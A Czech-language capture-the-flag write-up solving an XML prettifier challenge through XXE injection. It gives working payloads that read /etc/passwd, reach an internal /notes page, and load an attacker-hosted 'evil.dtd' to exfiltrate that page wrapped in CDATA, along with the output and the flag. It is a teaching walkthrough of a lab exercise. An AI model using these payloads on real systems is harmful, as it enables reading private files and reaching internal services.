# XML Prettifier

## Zadání

```
Hi, packet inspector,

some former employe of Mysterious Delivery Ltd. has created prettifier for XML code. It is polite to provide information to the AI in nicely formatted XML, isn't it? Rumors say that the employee also left some crucial information somewhere on the web.

Find the crucial information on webpage http://prettifier.mysterious-delivery.tcc:50000 .

May the Packet be with you!
```

## Řešení

Stránka nabízí "zkrášlení" XML kódu - mohlo by to být zranitelnost XXE (Xml External Entity - https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)

### 1. Vyzkouším zda lze extrahovat lokální soubory:

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<a>&xxe;</a>
```

Výstup:

```
<a>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</a>
```

### 2. Pokus o extrakci `/notes`

Flag je uložen na stránce `/notes` nedostupné zvenku. Zkusíme tedy extrahovat pomocí http://127.0.0.1

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:50000/notes" >]>
<a>&xxe;</a>
```

Toto bohužel ohlásí chybu (`<string>:1:1:FATAL:PARSER:ERR_DOCUMENT_EMPTY: Start tag expected, '<' not found`), stránka totiž obsahuje nevalidní XML.
Pro extrakci tak musíme použít CDATA a externí DTD soubor, který umístíme na náš server ve VPN:

**evil.dtd**

```
<!ENTITY % file SYSTEM "http://localhost:50000/notes">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

**Vstup**

```
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://10.200.0.11/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```

**Výstup**

```
<data>

&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  
&lt;head&gt;
	&lt;meta charset="utf-8"&gt;
	&lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;
	&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous"&gt;
	&lt;title&gt;Notes&lt;/title&gt;

	&lt;link rel="stylesheet" href="/static/style.css"&gt;
&lt;/head&gt;

&lt;body&gt;
	&lt;nav class="navbar navbar-expand navbar-dark bg-dark fixed-top py-0"&gt;
		&lt;div class="container"&gt;
			&lt;a class="navbar-brand" href="/"&gt;Prettier&lt;/a&gt;
			&lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"&gt;&lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;&lt;/button&gt;
			&lt;div class="collapse navbar-collapse" id="navbarResponsive"&gt;
				&lt;ul class="navbar-nav ml-auto"&gt;
					&lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/notes"&gt;Notes&lt;/a&gt;&lt;/li&gt;
				&lt;/ul&gt;
			&lt;/div&gt;
		&lt;/div&gt;
	&lt;/nav&gt;

        &lt;div class="container"&gt;
		&lt;div&gt;
		
		
		
		&lt;/div&gt;

		
&lt;h1&gt;Notes&lt;/h1&gt;
&lt;span id="flag"&gt;FLAG{GG53-5U3w-VT8F-qB31}&lt;/span&gt;

        &lt;/div&gt;

	&lt;script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"&gt;&lt;/script&gt;
	&lt;script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js" integrity="sha256-SyTu6CwrfOhaznYZPoolVw2rxoY7lKYKQvqbtqN93HI=" crossorigin="anonymous"&gt;&lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;</data>
```

## Vlajka

```
FLAG{GG53-5U3w-VT8F-qB31}
```